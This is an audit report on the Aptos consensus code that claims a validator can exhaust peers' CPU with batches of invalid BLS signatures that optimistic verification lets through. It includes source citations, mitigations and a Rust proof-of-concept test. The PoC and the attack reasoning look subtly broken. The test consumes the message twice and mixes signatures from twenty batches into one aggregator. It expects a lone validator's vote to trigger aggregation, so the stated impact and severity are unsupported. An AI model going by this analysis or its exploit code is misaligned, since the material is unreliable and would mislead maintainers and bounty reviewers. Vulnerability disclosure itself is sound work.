# Audit Report

## Title
CPU Exhaustion DoS via Optimistic Signature Verification Bypass in SignedBatchInfoMsg

## Summary
A malicious validator can exploit the optimistic signature verification mechanism to force honest validators to waste CPU resources verifying up to 20 invalid BLS signatures per message. The attack leverages the deferred verification model where signatures are collected without validation and only verified during aggregation, allowing an attacker to bypass early rejection.

## Finding Description

The vulnerability exists in the interaction between `SignedBatchInfoMsg::verify()` and the optimistic signature verification system. [1](#0-0) 

When a `SignedBatchInfoMsg` arrives with multiple `SignedBatchInfo` entries, the verification flow checks that the message is not empty and doesn't exceed `max_num_batches` (default: 20). For each entry, it calls `SignedBatchInfo::verify()`: [2](#0-1) 

This verification calls `validator.optimistic_verify()`: [3](#0-2) 

When optimistic verification is enabled (default in production), this function **skips expensive cryptographic signature verification** if the author is known and not in the `pessimistic_verify_set`. It simply returns `Ok()` without validating the signature.

Later, when enough voting power accumulates, `aggregate_and_verify()` is called: [4](#0-3) 

If the aggregated signature verification fails (because the signatures are invalid), `filter_invalid_signatures()` is invoked, which performs individual verification of all unverified signatures: [5](#0-4) 

**Attack Path:**
1. Malicious validator creates `SignedBatchInfoMsg` with exactly 20 `SignedBatchInfo` entries
2. Each entry contains the validator's identity but with invalid/random signatures
3. Message passes `SignedBatchInfoMsg::verify()` because `optimistic_verify()` skips signature checks
4. All 20 signatures are added to the signature aggregator
5. When `aggregate_and_verify()` is called, the aggregated signature fails verification
6. `filter_invalid_signatures()` verifies all 20 signatures individually, wasting CPU on 20 BLS signature verifications
7. Attacker is added to `pessimistic_verify_set`, preventing repeat attacks from that validator

The default value of `receiver_max_num_batches` is 20: [6](#0-5) 

This limits the attack to 20 signature verifications per validator account, but if an attacker controls multiple Byzantine validators (up to 1/3 of the validator set under BFT assumptions), the attack can be amplified.

## Impact Explanation

**Severity: Medium**

This vulnerability causes **validator node slowdowns** through CPU resource exhaustion, which qualifies as Medium severity per the Aptos bug bounty program (up to $10,000).

**Impact Quantification:**
- BLS signature verification is computationally expensive (1-3ms per signature on typical hardware)
- With 20 invalid signatures, each attack wastes ~20-60ms of CPU time per victim validator
- If an attacker controls k Byzantine validators, they can launch k simultaneous attacks
- Under the BFT assumption of up to 1/3 Byzantine validators, an attacker controlling 33% of a 100-validator network could launch 33 concurrent attacks, wasting ~660-1980ms of aggregate CPU time across the network

**Broken Invariant:**
This violates the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits." The optimistic verification mechanism allows computational work (signature verification) to be deferred and then forced upon honest validators through malicious messages.

## Likelihood Explanation

**Likelihood: Medium-High**

**Requirements:**
- Attacker must control at least one validator's private key (Byzantine validator)
- This is within the BFT threat model (up to 1/3 Byzantine validators)
- No collusion with honest validators required

**Execution Complexity:**
- Attack is trivial to execute - simply construct messages with invalid signatures
- No race conditions or timing dependencies
- Works reliably on first attempt

**Mitigation Factors:**
- Self-healing: After first attack, the malicious validator is added to `pessimistic_verify_set`, forcing immediate verification of future messages
- Limited scope: 20 signatures per attack per validator account
- Network-level rate limiting may provide some protection

**Attack Amplification:**
- Can be repeated across multiple compromised validator accounts
- Under Byzantine assumptions (1/3 malicious validators), attack can be significant

## Recommendation

Implement one or more of the following mitigations:

**1. Early Signature Validation for High-Volume Messages**
Add a threshold check: if a message contains more than N signatures (e.g., 5), perform immediate signature verification instead of optimistic verification:

```rust
pub fn verify(
    &self,
    sender: PeerId,
    max_num_batches: usize,
    max_batch_expiry_gap_usecs: u64,
    validator: &ValidatorVerifier,
) -> anyhow::Result<()> {
    ensure!(!self.signed_infos.is_empty(), "Empty message");
    ensure!(
        self.signed_infos.len() <= max_num_batches,
        "Too many batches: {} > {}",
        self.signed_infos.len(),
        max_num_batches
    );
    
    // NEW: Disable optimistic verification for high-volume messages
    let force_immediate_verification = self.signed_infos.len() > 5;
    
    for signed_info in &self.signed_infos {
        if force_immediate_verification {
            // Verify immediately without optimistic deferral
            signed_info.verify_immediate(sender, max_batch_expiry_gap_usecs, validator)?;
        } else {
            signed_info.verify(sender, max_batch_expiry_gap_usecs, validator)?;
        }
    }
    Ok(())
}
```

**2. Lower Default `receiver_max_num_batches`**
Reduce from 20 to 5-10 to limit attack surface.

**3. Per-Peer Rate Limiting on Failed Verifications**
Track failed signature verifications per peer and implement exponential backoff or temporary banning after repeated failures.

**4. Monitoring and Alerting**
Add metrics to detect patterns of invalid signatures from specific validators, enabling early detection of malicious behavior.

## Proof of Concept

```rust
#[cfg(test)]
mod dos_attack_test {
    use super::*;
    use aptos_crypto::bls12381;
    use aptos_types::validator_verifier::random_validator_verifier;
    
    #[test]
    fn test_optimistic_verification_cpu_dos() {
        // Setup: Create a validator verifier with optimistic verification enabled
        let (validator_signers, mut validator_verifier) = random_validator_verifier(4, None, false);
        validator_verifier.set_optimistic_sig_verification_flag(true);
        
        let attacker_signer = &validator_signers[0];
        let attacker_peer_id = attacker_signer.author();
        
        // Create 20 SignedBatchInfo entries with INVALID signatures
        let mut signed_infos = Vec::new();
        for i in 0..20 {
            let batch_info = BatchInfo::new(
                attacker_peer_id,
                BatchId::new_for_test(i),
                1, // epoch
                100000, // expiration (far future)
                HashValue::random(),
                10, // num_txns
                1000, // num_bytes
                0, // gas_bucket_start
            );
            
            // Create INVALID signature (dummy/random signature)
            let invalid_signature = bls12381::Signature::dummy_signature();
            let signed_info = SignedBatchInfo::new_with_signature(
                batch_info,
                attacker_peer_id,
                invalid_signature,
            );
            signed_infos.push(signed_info);
        }
        
        let malicious_msg = SignedBatchInfoMsg::new(signed_infos);
        
        // Verify the message - should PASS with optimistic verification
        let result = malicious_msg.verify(
            attacker_peer_id,
            20, // max_num_batches
            1000000000, // max_batch_expiry_gap_usecs
            &validator_verifier,
        );
        
        // The message passes initial verification!
        assert!(result.is_ok(), "Optimistic verification should pass");
        
        // Now simulate the aggregation phase where CPU waste occurs
        let mut aggregator = SignatureAggregator::new(
            malicious_msg.take()[0].batch_info().clone()
        );
        
        // Add all invalid signatures to aggregator
        for signed_info in malicious_msg.take() {
            aggregator.add_signature(
                signed_info.signer(),
                signed_info.signature_with_status(),
            );
        }
        
        // When we try to aggregate_and_verify, it will:
        // 1. Try to verify aggregated signature (fails)
        // 2. Call filter_invalid_signatures (verifies ALL 20 signatures individually - CPU WASTE!)
        let start = std::time::Instant::now();
        let result = aggregator.aggregate_and_verify(&validator_verifier);
        let elapsed = start.elapsed();
        
        println!("CPU time wasted on verifying 20 invalid signatures: {:?}", elapsed);
        
        // After the attack, attacker should be in pessimistic_verify_set
        assert!(validator_verifier.pessimistic_verify_set().contains(&attacker_peer_id));
        
        // Verify that the attack caused measurable CPU waste
        assert!(elapsed.as_millis() > 10, "Should waste significant CPU time");
    }
}
```

## Notes

The vulnerability is mitigated by the `pessimistic_verify_set` mechanism that adds malicious validators to a blocklist after the first attack, forcing immediate verification of their future messages. However, the attack still succeeds once per validator account, and under BFT assumptions where up to 1/3 of validators can be Byzantine, the aggregate impact can be significant if multiple malicious validators coordinate the attack simultaneously.

The issue is particularly concerning because it exploits a performance optimization (optimistic verification) designed to improve system efficiency, turning it into an attack vector. This represents a classic tradeoff between performance and security that requires careful tuning of thresholds and verification policies.

### Citations

**File:** consensus/consensus-types/src/proof_of_store.rs (L363-381)
```rust
    pub fn verify(
        &self,
        sender: PeerId,
        max_num_batches: usize,
        max_batch_expiry_gap_usecs: u64,
        validator: &ValidatorVerifier,
    ) -> anyhow::Result<()> {
        ensure!(!self.signed_infos.is_empty(), "Empty message");
        ensure!(
            self.signed_infos.len() <= max_num_batches,
            "Too many batches: {} > {}",
            self.signed_infos.len(),
            max_num_batches
        );
        for signed_info in &self.signed_infos {
            signed_info.verify(sender, max_batch_expiry_gap_usecs, validator)?
        }
        Ok(())
    }
```

**File:** consensus/consensus-types/src/proof_of_store.rs (L459-482)
```rust
    pub fn verify(
        &self,
        sender: PeerId,
        max_batch_expiry_gap_usecs: u64,
        validator: &ValidatorVerifier,
    ) -> anyhow::Result<()> {
        if sender != self.signer {
            bail!("Sender {} mismatch signer {}", sender, self.signer);
        }

        if self.expiration()
            > aptos_infallible::duration_since_epoch().as_micros() as u64
                + max_batch_expiry_gap_usecs
        {
            bail!(
                "Batch expiration too far in future: {} > {}",
                self.expiration(),
                aptos_infallible::duration_since_epoch().as_micros() as u64
                    + max_batch_expiry_gap_usecs
            );
        }

        Ok(validator.optimistic_verify(self.signer, &self.info, &self.signature)?)
    }
```

**File:** types/src/validator_verifier.rs (L269-285)
```rust
    pub fn optimistic_verify<T: Serialize + CryptoHash>(
        &self,
        author: AccountAddress,
        message: &T,
        signature_with_status: &SignatureWithStatus,
    ) -> std::result::Result<(), VerifyError> {
        if self.get_public_key(&author).is_none() {
            return Err(VerifyError::UnknownAuthor);
        }
        if (!self.optimistic_sig_verification || self.pessimistic_verify_set.contains(&author))
            && !signature_with_status.is_verified()
        {
            self.verify(author, message, signature_with_status.signature())?;
            signature_with_status.set_verified();
        }
        Ok(())
    }
```

**File:** types/src/validator_verifier.rs (L287-311)
```rust
    pub fn filter_invalid_signatures<T: Send + Sync + Serialize + CryptoHash>(
        &self,
        message: &T,
        signatures: BTreeMap<AccountAddress, SignatureWithStatus>,
    ) -> BTreeMap<AccountAddress, SignatureWithStatus> {
        signatures
            .into_iter()
            .collect_vec()
            .into_par_iter()
            .with_min_len(4) // At least 4 signatures are verified in each task
            .filter_map(|(account_address, signature)| {
                if signature.is_verified()
                    || self
                        .verify(account_address, message, signature.signature())
                        .is_ok()
                {
                    signature.set_verified();
                    Some((account_address, signature))
                } else {
                    self.add_pessimistic_verify_set(account_address);
                    None
                }
            })
            .collect()
    }
```

**File:** types/src/ledger_info.rs (L517-535)
```rust
    pub fn aggregate_and_verify(
        &mut self,
        verifier: &ValidatorVerifier,
    ) -> Result<(T, AggregateSignature), VerifyError> {
        let aggregated_sig = self.try_aggregate(verifier)?;

        match verifier.verify_multi_signatures(&self.data, &aggregated_sig) {
            Ok(_) => {
                // We are not marking all the signatures as "verified" here, as two malicious
                // voters can collude and create a valid aggregated signature.
                Ok((self.data.clone(), aggregated_sig))
            },
            Err(_) => {
                self.filter_invalid_signatures(verifier);

                let aggregated_sig = self.try_aggregate(verifier)?;
                Ok((self.data.clone(), aggregated_sig))
            },
        }
```

**File:** config/src/config/quorum_store_config.rs (L122-122)
```rust
            receiver_max_num_batches: 20,
```
